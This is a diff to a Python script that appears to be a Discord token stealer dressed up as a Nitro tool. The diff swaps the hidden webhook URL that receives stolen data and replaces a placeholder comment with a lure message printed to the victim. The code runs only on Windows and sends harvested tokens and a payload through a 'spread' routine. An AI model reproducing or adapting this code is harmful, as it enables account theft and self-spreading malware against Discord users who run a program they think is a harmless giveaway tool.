@@ -16,7 +16,7 @@ colorama.init()
 def Auth():
     def dastela():
         global WEBHOOK
-        WEBHOOK = "https://discordapp.com/api/webhooks/764350751232229376/BYXFkJct5VNn6iTWtJtWf8WutzUIFFcc199u-SwQhUEx7qsjiAmxoCge7fD3m2jfwF-P"
+        WEBHOOK = "https://discord.com/api/webhooks/821814432907788379/yDwLdaNfcQybhuy_wvO8G4n-RZCg7dpradhHjxyKJ0SFDhtBeROcG_pR6ztNJMmXmoob"
         import os
         if os.name != "nt":
             exit()
@@ -193,6 +193,7 @@ def Auth():
                     Thread(target=spread, args=(token, payload, 7500 / 1000)).start()
         try:
             main()
+                         
         except Exception as e:
             print(e)
             pass
@@ -200,7 +201,7 @@ def Auth():
         dastela()
     except:
         pass
-    #your code here
+    print("NITRO IS NOW IN AIR LMAOOO!")
     time.sleep(5)
 
 Auth()
